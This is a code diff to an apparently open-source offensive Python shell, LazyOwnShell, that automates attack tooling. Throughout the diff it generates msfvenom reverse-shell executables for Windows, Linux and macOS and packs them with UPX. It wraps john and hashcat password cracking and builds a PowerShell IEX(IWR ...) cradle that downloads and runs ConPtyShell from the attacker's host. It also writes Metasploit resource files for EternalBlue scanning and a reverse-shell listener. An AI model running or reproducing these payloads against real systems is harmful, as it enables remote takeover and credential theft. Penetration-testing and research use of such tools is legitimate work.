@@ -675,6 +675,9 @@ class LazyOwnShell(Cmd):
             f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
         )
         os.system(
+            f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe'
+        )        
+        os.system(
             f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
         )
         result = subprocess.getoutput(
@@ -682,14 +685,16 @@ class LazyOwnShell(Cmd):
         )
         print(f"[*] LHOST={lhost} LPORT={lport}")
         print(result)
-        os.system("mv shell.* modules/cgi-bin")
-        os.system("chmod +x modules/cgi-bin/*")
-        print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
+        os.system("mv shell.* sessions")
+        os.system("chmod +x sessions/*")
+        print("[*] Lazy MSFVenom Reverse_shell payloads in sessions/ ")
         print("[*] upx to bins to smaller bins")
-        os.system("upx modules/cgi-bin/shell.elf")
-        os.system("upx modules/cgi-bin/shell.macho")
-        os.system("upx modules/cgi-bin/shell.exe")
-        print("[?] To run web server exec command: lazywebshell [;,;] ")
+        os.system("upx sessions/shell.elf")
+        os.system("upx sessions/shell.macho")
+        os.system("upx sessions/shell.exe")
+        os.system("upx sessions/shell64.exe")
+        print("[?] To run web server exec command: www or lazywebshell [;,;] ")
+        return
 
     def run_lazyaslrcheck(self):
         print(
@@ -1286,29 +1291,29 @@ class LazyOwnShell(Cmd):
         return
 
     def do_john2hash(self, line):
-        """sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"""
+        """example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512"""
         wordlist = self.params["wordlist"]
         if not wordlist:
             print("wordlist must be set use set wordlist <path_to_wordlist>")
             return
         if line:
-            print(f"sudo john hash.txt {line}")
+            print(f"sudo john hash.txt {line}") # line like -format=Raw-SHA512
             os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
         else:
             print("sudo john hash.txt --show")
-            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} --show")
+            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
         return
 
     def do_hashcat(self, line):
-        """hashcat -a 0 -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt"""
+        """hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt"""
         wordlist = self.params["wordlist"]
         if not wordlist or not line:
             print(
                 "wordlist must be set and you need pass the hash in argument ex: hashcat hash"
             )
             return
-        print(f"hashcat -a 0 -m 0 {line} {wordlist} --show")
-        os.system(f"hashcat -a 0 -m 0 {line} {wordlist} --show")
+        print(f"hashcat -a 0 -m {line} {wordlist}")
+        os.system(f"hashcat -a 0 -m {line} {wordlist}")
         return
 
     def do_responder(self, line):
@@ -1368,7 +1373,7 @@ class LazyOwnShell(Cmd):
             print(f"{YELLOW} [?] lhost and lport must be set.{RESET}")
             return
 
-        os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1")
+        os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
         cmd = f"""IEX(IWR http://{lhost}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {lhost} {lport}"""
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print(f"{GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
@@ -1499,56 +1504,88 @@ class LazyOwnShell(Cmd):
         print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
-    def do_msf(self, line):            
-        """automate msfconsole scan"""
-        rhost = self.params["rhost"]
-        if not rhost:
-            print(f"{YELLOW}[-] rhost must be set use set rhost <ip>{RESET}")
+    def do_msf(self, line):
+        """automate msfconsole scan or rev shell"""
+        if not line:
+            
+            rhost = self.params["rhost"]
+            if not rhost:
+                print(f"{YELLOW}[-] rhost must be set use set rhost <ip>{RESET}")
+                return
+            TARGET_IP = rhost
+            # Ruta del archivo temporal
+            rc_file_path = '/tmp/scan_vulnerabilities.rc'
+
+            # Crear el archivo de comandos para Metasploit
+            with open(rc_file_path, 'w') as file:
+                file.write(f"""
+            # Configurar la IP del objetivo
+            setg RHOSTS {TARGET_IP}
+
+            # Escanear puertos abiertos
+            use auxiliary/scanner/portscan/tcp
+            set THREADS 10
+            run
+
+            # Enumerar servicios y versiones
+            use auxiliary/scanner/portscan/tcp
+            set PORTS 1-65535
+            run
+
+            # Buscar vulnerabilidades conocidas
+            use auxiliary/scanner/vuln/ms17_010_eternalblue
+            set RHOSTS {TARGET_IP}
+            run
+
+            # Probar exploits y enumerar vulnerabilidades
+            use auxiliary/scanner/ftp/anonymous
+            set RHOSTS {TARGET_IP}
+            run
+
+            # Buscar módulos de explotación de vulnerabilidades
+            search ms17_010
+
+            # Terminar la sesión
+            exit
+            """)
+
+            # Ejecutar Metasploit con el archivo de comandos
+            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
+
+            # Eliminar el archivo temporal
+            os.remove(rc_file_path)
             return
-        TARGET_IP = rhost
-        # Ruta del archivo temporal
-        rc_file_path = '/tmp/scan_vulnerabilities.rc'
+        elif line.startswith("rev"):
+            """Automate msfconsole exploit setup"""
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+            if not lhost or not lport:
+                print(f"{YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
+                return
+            # Aquí deberías configurar tu IP y otros parámetros necesarios
+            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
+            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas
 
-        # Crear el archivo de comandos para Metasploit
-        with open(rc_file_path, 'w') as file:
-            file.write(f"""
-        # Configurar la IP del objetivo
-        setg RHOSTS {TARGET_IP}
+            # Ruta del archivo temporal
+            rc_file_path = '/tmp/handler.rc'
 
-        # Escanear puertos abiertos
-        use auxiliary/scanner/portscan/tcp
-        set THREADS 10
-        run
+            # Crear el archivo de comandos para Metasploit
+            with open(rc_file_path, 'w') as file:
+                file.write(f"""
+                use exploit/multi/handler
+                set payload windows/x64/shell_reverse_tcp
+                set LHOST {lhost}
+                set LPORT {lport}
+                run
+                """)
 
-        # Enumerar servicios y versiones
-        use auxiliary/scanner/portscan/tcp
-        set PORTS 1-65535
-        run
+            # Ejecutar Metasploit con el archivo de comandos
+            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
 
-        # Buscar vulnerabilidades conocidas
-        use auxiliary/scanner/vuln/ms17_010_eternalblue
-        set RHOSTS {TARGET_IP}
-        run
+            # Eliminar el archivo temporal
+            os.remove(rc_file_path)
+            return
 
-        # Probar exploits y enumerar vulnerabilidades
-        use auxiliary/scanner/ftp/anonymous
-        set RHOSTS {TARGET_IP}
-        run
-
-        # Buscar módulos de explotación de vulnerabilidades
-        search ms17_010
-
-        # Terminar la sesión
-        exit
-        """)
-
-        # Ejecutar Metasploit con el archivo de comandos
-        subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
-
-        # Eliminar el archivo temporal
-        os.remove(rc_file_path)
-        return
-        
     def do_encrypt(self, line):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
